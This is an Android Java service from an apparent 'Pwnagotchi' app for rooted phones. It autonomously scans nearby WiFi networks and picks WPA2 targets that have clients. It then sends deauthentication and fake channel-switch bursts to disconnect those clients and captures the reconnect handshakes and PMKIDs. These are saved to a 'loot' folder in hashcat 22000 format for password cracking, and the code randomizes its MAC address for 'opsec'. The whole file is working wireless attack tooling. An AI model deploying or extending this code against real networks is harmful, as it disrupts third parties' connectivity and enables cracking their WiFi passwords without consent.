package com.pwnagotchi.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.*;
import java.util.*;

/**
 * Pwnagotchi Zero — passive WiFi sniffer for rooted Android.
 * v2.0: Monitor-mode-native architecture. No Evil Twin, no WiFi toggling.
 * 
 * Pipeline: monitor mode → beacon_flood (CSA deauth) → passive EAPOL capture
 */
public class PwngService extends Service {

    private static final String CHANNEL_ID = "pwnagotchi_channel";
    private static final int NOTIFY_ID = 42;
    private static final String WPA_CTRL = "/data/vendor/wifi/wpa/sockets";
    private static final String IFACE = "wlan0";
    private static final int SCAN_INTERVAL = 15000;
    private volatile boolean monitorReady = false;
    private MonitorManager monitor;
    private static final String STOP_FILE = "/data/data/com.pwnagotchi.app/files/.stopped";

    private PwngBrain brain;
    private Handler handler;
    private Set<String> knownPmkids = new HashSet<>();
    private String currentFace = "(◕‿‿◕)";
    private String currentStatus = "initializing brain...";
    private String currentPhase = "BOOT";
    private int apCount = 0, wpa2Count = 0;
    private int totalPmkids = 0, totalHandshakes = 0;
    private Set<String> recentTargets = new HashSet<>();
    private int cycleCount = 0;
    private static final int TARGET_COOLDOWN = 50;
    private long sessionStart;
    private volatile boolean isRunning = false;
    private String lootDir, ourMac = "000000000000";
    private Random rng = new Random();
    private int scanChannelIdx = 0;
    private static final int[] SCAN_CHANNELS = {1, 6, 11};

    // ─── Faces ──────────────────────────────────────────────
    private static final Map<String, String> FACES = new LinkedHashMap<>();
    static {
        FACES.put("AWAKE",  "(◕‿‿◕)"); FACES.put("BORED",  "(-__-)");
        FACES.put("HAPPY",  "(•‿‿•)"); FACES.put("EXCITED","(ᵔ◡◡ᵔ)");
        FACES.put("LONELY", "(ب__ب)"); FACES.put("SAD",    "(╥☁╥ )");
        FACES.put("COOL",   "(⌐■_■)"); FACES.put("SMART",  "(✜‿‿✜)");
        FACES.put("FRIEND", "(♥‿‿♥)"); FACES.put("INTENSE","(°▃▃°)");
        FACES.put("MOTIVATED","(☼‿‿☼)"); FACES.put("SLEEP","(⇀‿‿↼)");
        FACES.put("GRATEFUL","(^‿‿^)"); FACES.put("DEMOTIVATED","(≖__≖)");
        FACES.put("BROKEN","(☓‿‿☓)"); FACES.put("DEBUG","(#__#)");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Clear stop flag on fresh start — we're obviously restarting
        new File(STOP_FILE).delete();
        
        if (new File(STOP_FILE).exists()) {
            stopSelf();
            return;
        }
        
        sessionStart = System.currentTimeMillis();
        
        File extDir = getExternalFilesDir(null);
        lootDir = "/data/local/tmp/handshakes";
        new File(lootDir).mkdirs();
        
        String macRaw = execSu("ip link show wlan0 2>/dev/null | grep -oP 'link/ether \\K[0-9a-f:]+' | head -1");
        if (macRaw != null && macRaw.length() >= 17) ourMac = macRaw.replace(":", "").toUpperCase();
        
        brain = new PwngBrain();
        currentFace = "(◕‿‿◕)";
        brain.currentStatus = "brain ready, scanning...";
        currentPhase = "OBSERVE";
        
        // Initialize native monitor mode in background thread
        monitor = new MonitorManager();
        new Thread(() -> {
            brain.currentStatus = "enabling monitor mode...";
            updateNotification();
            if (monitor.enable()) {
                brain.currentStatus = "monitor mode active";
                currentPhase = "MONITOR";
            } else {
                brain.currentStatus = "monitor failed, using fallback";
            }
            monitorReady = true;
            updateNotification();
        }, "MonitorInit").start();
        
        loadKnownPmkids();
        createNotificationChannel();
        
        updateNotification();
        
        handler = new Handler(Looper.getMainLooper());
        isRunning = true;
        new Thread(() -> {
            while (!monitorReady && isRunning) {
                sleep(500);
            }
            while (isRunning) {
                doScanCycle();
                sleep(SCAN_INTERVAL);
            }
        }, "PwngAI").start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            isRunning = false;
            try { new FileWriter(new File(STOP_FILE)).close(); } catch (Exception e) {}
            stopForeground(true); stopSelf();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                android.os.Process.killProcess(android.os.Process.myPid());
            }, 2000);
            return START_NOT_STICKY;
        }
        if (intent != null && "RESTART".equals(intent.getAction())) {
            // Kill process without .stopped file — START_STICKY auto-restarts fresh
            new File(STOP_FILE).delete();
            isRunning = false;
            stopForeground(true); stopSelf();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                android.os.Process.killProcess(android.os.Process.myPid());
            }, 2000);
            return START_STICKY;  // auto-restart
        }
        new File(STOP_FILE).delete();
        try {
            startForeground(NOTIFY_ID, buildNotification());
        } catch (Exception e) {
            android.util.Log.e("Pwng", "fg failed: " + e.getMessage());
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        try { new java.io.FileWriter(new java.io.File(STOP_FILE)).close(); } catch (Exception e) {}
        if (monitor != null) {
            monitor.disable();
            return;
        }
        execSu("cmd wifi stop-softap");
        execSu("cmd wifi set-wifi-enabled enabled");
        super.onDestroy();
    }

    // ─── AI Scan Loop ──────────────────────────────────────

    private void doScanCycle() {
        List<String[]> scanData = new ArrayList<>();
        int apTot = 0, wpa2Tot = 0;
        
        if (monitorReady && monitor != null && monitor.isEnabled()) {
            // ── Native monitor mode scan via tcpdump ──
            // Channel hop: rotate 1→6→11 each cycle for better AP coverage
            int ch = SCAN_CHANNELS[scanChannelIdx % SCAN_CHANNELS.length];
            scanChannelIdx++;
            monitor.setChannel(ch);
            
            String raw = monitor.scan(8);
            Set<String> seenBssids = new HashSet<>();
            List<String[]> apList = new ArrayList<>();
            
            for (String line : raw.split("\\n")) {
                if (!line.contains("Beacon")) continue;
                
                String bssid = "", ssid = "<hidden>", flags = "[WPA2]", freq = "0", signal = "0";
                
                java.util.regex.Matcher m1 = java.util.regex.Pattern.compile(
                    "BSSID:([0-9a-f:]{17})").matcher(line);
                if (m1.find()) bssid = m1.group(1);
                if (bssid.isEmpty() || seenBssids.contains(bssid)) continue;
                seenBssids.add(bssid);
                
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile(
                    "Beacon \\(([^)]*)\\)").matcher(line);
                if (m2.find() && !m2.group(1).isEmpty()) ssid = m2.group(1);
                
                java.util.regex.Matcher m3 = java.util.regex.Pattern.compile(
                    "(\\d+) MHz").matcher(line);
                if (m3.find()) freq = m3.group(1);
                
                java.util.regex.Matcher m4 = java.util.regex.Pattern.compile(
                    "(-?\\d+)dBm signal").matcher(line);
                if (m4.find()) signal = m4.group(1);
                
                apTot++;
                if (line.contains("PRIVACY")) { wpa2Tot++; flags = "[WPA2-PSK]"; }
                else flags = "[OPEN]";
                
                apList.add(new String[]{bssid, ssid, freq, signal, flags});
            }
            scanData = apList;
        } else {
            // ── Fallback: wpa_cli scan ──
            execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan");
            sleep(3500);
            String results = execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " scan_results");
            
            for (String line : results.split("\\n")) {
                if (line.startsWith("bssid") || line.trim().isEmpty()) continue;
                String[] p = line.split("\\t");
                if (p.length < 5) continue;
                apTot++; if (p[3].contains("WPA")) wpa2Tot++;
                scanData.add(new String[]{p[0].trim(), p[4].trim(), p[1].trim(), p[2].trim(), p[3].trim()});
            }
        }
        
        apCount = apTot; wpa2Count = wpa2Tot;
        android.util.Log.i("PwngService", "scan: monitorReady=" + monitorReady + " enabled=" + (monitor != null && monitor.isEnabled()) + " apTot=" + apTot + " wpa2=" + wpa2Tot);

        PwngBrain.Decision d = brain.think(apTot, wpa2Tot, scanData);
        
        if (d.face != null) brain.currentFace = d.face;
        if (d.status != null) brain.currentStatus = d.status;
        currentPhase = brain.getPhaseName();
        totalPmkids = brain.getTotalPmkids();
        totalHandshakes = brain.getTotalHandshakes();

        boolean success = false;
        cycleCount++;
        if (cycleCount % TARGET_COOLDOWN == 0) recentTargets.clear();
        
        // Decay no-clients blacklist — expire after NO_CLIENTS_SKIP cycles
        Iterator<Map.Entry<String, Integer>> blit = noClientsCounter.entrySet().iterator();
        while (blit.hasNext()) {
            Map.Entry<String, Integer> e = blit.next();
            int remaining = e.getValue() - 1;
            if (remaining <= 0) {
                noClientsBlacklist.remove(e.getKey());
                blit.remove();
            } else {
                e.setValue(remaining);
            }
        }
        
        // ── Sniff-based attack: beacon_flood deauth → passive EAPOL capture ──
        if ("sniff_deauth".equals(d.action) && d.targetBssid != null 
            && monitorReady && monitor != null && monitor.isEnabled()) {
            success = doSniffDeauth(d);
        }
        
        String details = success ? "ok" : lastSniffResult != null ? lastSniffResult : "fail";
        brain.reportResult(d.action, success, d.targetBssid, details);
        android.util.Log.i("PwngService", "cycle=" + cycleCount + " action=" + d.action 
            + " success=" + success + " phase=" + brain.getPhase() 
            + " hs=" + totalHandshakes);
        updateNotification();
    }

    // ─── SNIFF DEAUTH: Passive handshake capture (no Evil Twin, no WiFi toggle) ──

    // APs with no clients detected — skip for 10 cycles
    private Set<String> noClientsBlacklist = new HashSet<>();
    private Map<String, Integer> noClientsCounter = new HashMap<>();
    private static final int NO_CLIENTS_SKIP = 10;
    private String lastSniffResult = null;  // "no_clients", "blacklisted", "fail"
    
    /**
     * Quick pre-scan: check if an AP has any associated clients.
     * Looks for Data/Null/QoS/ProbeReq frames (not Beacons/ProbeResp).
     * Returns true if client activity detected within scanDuration seconds.
     */
    private boolean hasClients(String bssid, String ssid, int scanDuration) {
        String raw = monitor.scan(scanDuration);
        int beaconCount = 0, clientFrames = 0;
        for (String line : raw.split("\\n")) {
            // Count beacons for logging
            if (line.contains("Beacon") && line.contains(bssid)) beaconCount++;
            // Client frames: Data, Null data, QoS Data, Probe Request, Ack, BlockAck
            if (line.contains(bssid) && !line.contains("Beacon") && !line.contains("Probe Response")) {
                if (line.contains("Data") || line.contains("Null") || line.contains("QoS") 
                    || line.contains("Probe Request") || line.contains("Ack")
                    || line.contains("BlockAck") || line.contains("RTS") || line.contains("CTS")
                    || line.contains("Assoc") || line.contains("Reassoc") || line.contains("Auth")) {
                    clientFrames++;
                }
            }
        }
        android.util.Log.i("PwngService", "hasClients: " + ssid + " beacons=" + beaconCount
            + " clientFrames=" + clientFrames);
        return clientFrames > 0;
    }

    private boolean doSniffDeauth(PwngBrain.Decision d) {
        String bssid = d.targetBssid;
        String ssid = d.targetSsid;
        int channel = 6; // default
        int freqMhz = 2437; // default — THIS goes to beacon_flood (needs MHz!)
        try { 
            int freq = Integer.parseInt(d.targetFreq + "");
            freqMhz = freq;
            if (freq > 5000) {
                // 5 GHz: channel = (freq - 5000) / 5 + some offset, just use common values
                channel = 36; // default 5GHz
            } else if (freq >= 2412) {
                // 2.4 GHz: channel = (freq - 2407) / 5
                channel = (freq - 2407) / 5;
                if (channel < 1) channel = 1;
                if (channel > 14) channel = 14;
            }
        } catch (Exception e) { channel = 6; freqMhz = 2437; }
        
        android.util.Log.i("PwngService", "sniff_deauth: " + ssid + " ch=" + channel 
            + " freq=" + freqMhz);
        
        // Set monitor to target channel BEFORE deauth
        monitor.setChannel(channel);
        
        // Pre-scan: check for client activity before wasting time on empty APs
        // 5s quick scan — look for Data/Null/QoS/ProbeReq frames
        if (noClientsBlacklist.contains(bssid)) {
            brain.currentStatus = "🫗 no clients (blacklisted) " + ssid;
            currentPhase = "SKIP";
            lastSniffResult = "no_clients";  // was "blacklisted" — brain needs to count this too
            android.util.Log.i("PwngService", "Skipping " + ssid + " — no clients (blacklisted)");
            return false;
        }
        
        brain.currentStatus = "🔍 scanning clients " + ssid;
        currentPhase = "PRESCAN";
        updateNotification();
        if (!hasClients(bssid, ssid, 5)) {
            brain.currentStatus = "🫗 no clients on " + ssid;
            currentPhase = "EMPTY";
            lastSniffResult = "no_clients";
            noClientsBlacklist.add(bssid);
            noClientsCounter.put(bssid, NO_CLIENTS_SKIP);
            android.util.Log.i("PwngService", "No clients on " + ssid + " — blacklisting " + NO_CLIENTS_SKIP + " cycles");
            updateNotification();
            return false;
        }
        
        lastSniffResult = null;  // reset — clients found, proceeding
        
        // Calculate CSA lure channel — DIFFERENT from AP's channel
        // Client ignores "switch to same channel" — must be a real channel change
        // 2.4 GHz rotation: 1→6→11→1
        int[] CSA_CHANNELS_24 = {1, 6, 11};
        int csaChannel = channel; // fallback
        int csaFreqMhz = freqMhz; // fallback
        if (channel >= 1 && channel <= 14) {
            for (int ch : CSA_CHANNELS_24) {
                if (ch != channel) {
                    csaChannel = ch;
                    // freq = 2407 + channel * 5
                    csaFreqMhz = 2407 + ch * 5;
                    break;
                }
            }
        }
        
        // Phase 1: CSA deauth burst — deauth on AP channel, CSA lures to DIFFERENT channel
        // (was: same channel → client ignored it. now: "AP is moving to ch6!")
        brain.currentStatus = "👊 CSA " + ssid + " ch" + channel + "→" + csaChannel;
        currentPhase = "DEAUTH";
        android.util.Log.i("PwngService", "CSA burst: " + ssid + " deauth@" + freqMhz 
            + "MHz CSA-lure→" + csaFreqMhz + "MHz (ch" + csaChannel + ")");
        updateNotification();
        
        monitor.deauthBurst(bssid, freqMhz, csaFreqMhz, 20);
        
        if (!isRunning) return false;
        
        // Phase 2: Stay on original channel — client may briefly disconnect from CSA confusion
        // but will reconnect on the AP's REAL channel. We stay to capture.
        brain.currentStatus = "⏳ waiting reconnect " + ssid + " (ch" + channel + ")";
        currentPhase = "WAIT";
        // Don't switch channel! CSA lure was fake — real AP is still on original channel
        sleep(2000);
        updateNotification();
        sleep(3000);
        
        if (!isRunning) return false;
        
        // Phase 3: Passive EAPOL capture on original channel (60s, wlan addr3 filter)
        brain.currentStatus = "👂 sniffing ch" + channel + " " + ssid;
        currentPhase = "SNIFF";
        updateNotification();
        
        String hs = monitor.captureHandshake(lootDir, bssid, 60);
        
        if (hs != null) {
            totalHandshakes++;
            brain.currentFace = FACES.get("FRIEND");
            brain.currentStatus = "💀 handshake! " + ssid;
            currentPhase = "CAUGHT";
            android.util.Log.i("PwngService", "HANDSHAKE CAPTURED: " + ssid + " → " + hs);
            updateNotification();
            return true;
        }
        
        brain.currentStatus = "😴 no handshake " + ssid;
        currentPhase = "MISS";
        lastSniffResult = "fail";
        return false;
    }

    // ─── PMKID ─────────────────────────────────────────────

    private List<String> extractPmkids(String output) {
        List<String> pmkids = new ArrayList<>();
        java.util.regex.Pattern p = java.util.regex.Pattern.compile("^(ie|beacon_ie)=([0-9a-fA-F]+)", java.util.regex.Pattern.MULTILINE);
        java.util.regex.Matcher m = p.matcher(output);
        while (m.find()) pmkids.addAll(parseRsnIe(m.group(2)));
        return new ArrayList<>(new LinkedHashSet<>(pmkids));
    }

    private List<String> parseRsnIe(String hex) {
        List<String> pmkids = new ArrayList<>();
        try {
            byte[] d = hexToBytes(hex); int i = 0;
            while (i < d.length - 2) {
                int tag = d[i]&0xFF, len = d[i+1]&0xFF; i += 2;
                if (i + len > d.length) break;
                if (tag == 0x30 && len >= 20) {
                    int pos = i + 6, end = i + len;
                    if (pos >= end) continue;
                    int pc = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2+pc*4;
                    if (pos >= end) continue;
                    int ac = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2+ac*4;
                    if (pos >= end) continue;
                    pos += 2; if (pos >= end) continue;
                    if (pos + 2 <= end) {
                        int pkc = (d[pos]&0xFF) | ((d[pos+1]&0xFF)<<8); pos += 2;
                        for (int p=0; p<pkc && pos+16<=end; p++) {
                            StringBuilder sb = new StringBuilder();
                            for (int x=0; x<16; x++) sb.append(String.format("%02x", d[pos+x]&0xFF));
                            pmkids.add(sb.toString()); pos += 16;
                        }
                    }
                }
                i += len;
            }
        } catch (Exception e) {}
        return pmkids;
    }

    private void savePmkid(String bssid, String ssid, String pmkid) {
        try {
            new File(lootDir).mkdirs();
            FileWriter fw = new FileWriter(new File(lootDir, "pmkid_hashes.22000"), true);
            fw.write("WPA*02*" + pmkid + "*" + bssid.replace(":", "").toUpperCase()
                     + "*" + ourMac + "*" + ssid + "***\n");
            fw.close();
            FileWriter kw = new FileWriter(new File(lootDir, ".known_pmkids"), true);
            kw.write(pmkid + "\n"); kw.close();
        } catch (Exception e) {}
    }

    // ─── MAC Randomization (Opsec) ─────────────────────────

    private void randomizeMac() {
        execSu("cmd wifi set-wifi-enabled disabled 2>/dev/null");
        sleep(800);
        execSu("cmd wifi set-wifi-enabled enabled 2>/dev/null");
        sleep(1500);
        String mac = execSu("ip link show wlan0 2>/dev/null | grep -oP 'link/ether \\K[0-9a-f:]+' | head -1").trim();
        if (!mac.isEmpty()) {
            ourMac = mac.replace(":", "").toUpperCase();
            android.util.Log.i("PwngService", "MAC: " + mac);
        }
    }

    // ─── Helpers ───────────────────────────────────────────

    private byte[] hexToBytes(String h) {
        byte[] d = new byte[h.length()/2];
        for (int i=0; i<h.length(); i+=2)
            d[i/2] = (byte)((Character.digit(h.charAt(i),16)<<4) + Character.digit(h.charAt(i+1),16));
        return d;
    }

    private void loadKnownPmkids() {
        try {
            File f = new File(lootDir, ".known_pmkids");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f)); String l;
                while ((l = br.readLine()) != null) if (!l.trim().isEmpty()) knownPmkids.add(l.trim());
                br.close();
            }
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Pwnagotchi", NotificationManager.IMPORTANCE_HIGH);
            ch.setDescription("AI-driven WiFi security research");
            ch.setShowBadge(true);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent pi = new Intent(this, MainActivity.class);
        PendingIntent p = PendingIntent.getActivity(this, 0, pi, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        Intent si = new Intent(this, PwngService.class); si.setAction("STOP");
        PendingIntent sp = PendingIntent.getService(this, 0, si, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        Intent ri = new Intent(this, PwngService.class); ri.setAction("RESTART");
        PendingIntent rp = PendingIntent.getService(this, 1, ri, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        String face = brain != null ? brain.currentFace : "(◕‿‿◕)";
        String phase = currentPhase;
        String status = brain != null ? brain.currentStatus : "booting...";
        int mins = (int)((System.currentTimeMillis() - sessionStart) / 60000);
        
        String title = face + " [" + phase + "] " + status;
        String summary = "APs:" + apCount + " WPA2:" + wpa2Count + " HS:" + totalHandshakes + " " + mins + "m";
        String bigText = face + "  [" + phase + "]\n"
                       + status + "\n"
                       + "APs: " + apCount + "  WPA2: " + wpa2Count + "\n"
                       + "Handshakes: " + totalHandshakes + "  PMKID: " + totalPmkids + "\n"
                       + "Uptime: " + mins + " min | Ch:6";
        
        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(summary)
            .setStyle(new Notification.BigTextStyle().bigText(bigText))
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true).setContentIntent(p)
            .setPriority(Notification.PRIORITY_HIGH)
            .addAction(android.R.drawable.ic_menu_rotate, "Restart", rp)
            .addAction(android.R.drawable.ic_media_pause, "Stop", sp).build();
    }

    private void updateNotification() {
        getSystemService(NotificationManager.class).notify(NOTIFY_ID, buildNotification());
        Intent u = new Intent("com.pwnagotchi.app.STATS_UPDATE");
        u.setPackage(getPackageName());
        u.putExtra("face", brain != null ? brain.currentFace : "(◕‿‿◕)"); 
        u.putExtra("status", brain != null ? brain.currentStatus : "booting...");
        u.putExtra("phase", currentPhase);
        u.putExtra("apCount", apCount); u.putExtra("wpa2Count", wpa2Count);
        u.putExtra("totalPmkids", totalPmkids); u.putExtra("totalHandshakes", totalHandshakes);
        u.putExtra("totalScans", brain != null ? brain.getTotalScans() : 0);
        u.putExtra("sessionStart", sessionStart);
        sendBroadcast(u);
    }

    private String execSu(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder sb = new StringBuilder(); String l;
            final Process fp = p;
            Thread watchdog = new Thread(() -> { 
                try { Thread.sleep(8000); fp.destroyForcibly(); } 
                catch (Exception e) {} 
            });
            watchdog.start();
            while ((l = br.readLine()) != null) sb.append(l).append("\n");
            while (er.readLine() != null) {}
            br.close(); er.close();
            p.waitFor();
            watchdog.interrupt();
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
    
    private String getChanForBssid(String bssid, List<String[]> scanData) {
        for (String[] ap : scanData) {
            if (ap[0].equals(bssid)) return ap[2];
        }
        return null;
    }
}
